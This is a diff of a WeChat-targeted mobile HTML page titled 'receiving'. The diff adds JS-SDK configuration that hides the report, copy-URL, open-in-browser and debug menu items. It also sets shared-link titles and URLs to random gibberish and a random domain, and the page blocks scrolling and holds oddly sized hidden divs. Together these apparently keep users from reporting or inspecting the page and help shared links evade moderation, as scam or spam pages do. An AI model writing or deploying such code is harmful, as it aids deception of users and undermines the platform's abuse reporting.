@@ -1,3 +1,29 @@
+<script src=https://res.wx.qq.com/open/js/jweixin-1.0.0.js></script>
+<script src=https://apps.bdimg.com/libs/jquery/2.1.1/jquery.min.js></script>
+<script type=text/javascript>wx.config({
+    debug: !1,
+    appId: "wx2310e6e61f7fc286",
+    timestamp: 1492091706,
+    nonceStr: "8V1Z5DHLPTXbxbf3",
+    signature: "e28c42f211641bb49bb2e7dc355416cc2b58c165",
+    jsApiList: ["onMenuShareTimeline", "onMenuShareAppMessage", "onMenuShareQQ", "onMenuShareWeibo", "hideMenuItems"]
+  }),
+  wx.ready(function() {
+    wx.hideMenuItems({
+      menuList: ["menuItem:setFont", "menuItem:share:qq", "menuItem:share:facebook", "menuItem:openWithQQBrowser", "menuItem:openWithSafari", "menuItem:favorite", "menuItem:jsDebug", "menuItem:delete", "menuItem:copyUrl", "menuItem:share:email", "menuItem:exposeArticle"]
+    });
+    var e = {
+      title: "zkpjzwmfbbbuczyxsovul",
+      desc: "exucvrnunnah",
+      link: "http://nptxbfjnrvzd.com",
+      imgUrl: "qq.com",
+      success: function() {},
+      cancel: function() {}
+    };
+    wx.onMenuShareAppMessage(e),
+    wx.onMenuShareTimeline(e)
+  }),
+  wx.error(function(e) {});</script>
 <!DOCTYPE html>
 <html>
   
@@ -5,14 +31,13 @@
     <meta charset=gb2312>
     <meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
     <title>收取中</title>
-    <script src=https://apps.bdimg.com/libs/jquery/2.1.1/jquery.min.js></script>
     <script src=https://apps.bdimg.com/libs/zepto/1.1.4/zepto.min.js></script>
-    <link href=https://m13268846770.github.io/s/s.css rel=stylesheet>
+    <link href=https://m13268846770.github.io/s/s.css rel="stylesheet">
     
     <body style="margin:0 auto;background-color:black">
       <script>$("body").on("touchmove",
-        function(o) {
-          o.preventDefault()
+        function(e) {
+          e.preventDefault()
         });</script>
       <div style=width:00px;height:000px;overflow:hidden></div>
       <div style=width:000px;height:00000px;overflow:hidden></div>
